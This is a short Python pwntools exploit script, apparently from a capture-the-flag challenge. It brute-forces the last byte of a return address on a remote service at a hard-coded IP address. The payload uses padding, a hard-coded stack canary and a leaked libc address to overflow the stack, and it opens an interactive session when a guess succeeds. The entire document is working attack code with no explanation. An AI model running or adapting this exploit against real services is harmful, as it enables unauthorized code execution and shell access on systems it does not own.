#!/usr/bin/python

from pwn import *
import sys

HOST = '103.41.207.206'
PORT = int(sys.argv[1])

if __name__ == '__main__':
    context.log_level = 'warn'

    canary = p64(0xc54d966138e6ad00)

    # adding one by one
    libc_leak = b'\x2b\xf0\xca\x2e\xdc\x7f\x00\x00'

    for i in range(255, -1, -1):
        payload = b'A' * 0x38 + canary + canary + libc_leak + bytes([i])
        print(hex(i))
        r = remote(HOST, PORT)
        r.send(payload)
        r.recvline(0)
        try:
            r.recvline(0)
            r.interactive()
        except:
            pass
        r.close()
